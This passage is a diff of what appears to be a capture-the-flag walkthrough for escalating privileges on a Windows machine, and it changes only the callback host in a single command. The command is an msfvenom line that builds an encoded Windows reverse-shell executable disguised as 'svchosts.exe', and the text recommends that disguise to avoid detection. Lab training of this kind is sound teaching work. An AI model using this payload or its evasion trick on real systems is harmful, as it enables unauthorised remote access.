@@ -131,7 +131,7 @@ Now, we can begin looking for the user.txt flag! Start by checking desktop and d
 Now it's time to try and escalate our privileges. First, lets get an improved shell on the device. We are going to use msfvenom to create a reverse shell payload. We should encode it and name it similarly to a legitimate binary service to avoid detection.
 
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=Tun0-IP LPORT=5555 -e x86/shikata_ga_nai -f exe -o svchosts.exe  
+msfvenom -p windows/shell_reverse_tcp LHOST=MACHINE_IP LPORT=5555 -e x86/shikata_ga_nai -f exe -o svchosts.exe  
 ```
 
 **1) What is the final size of the exe payload that you generated?**
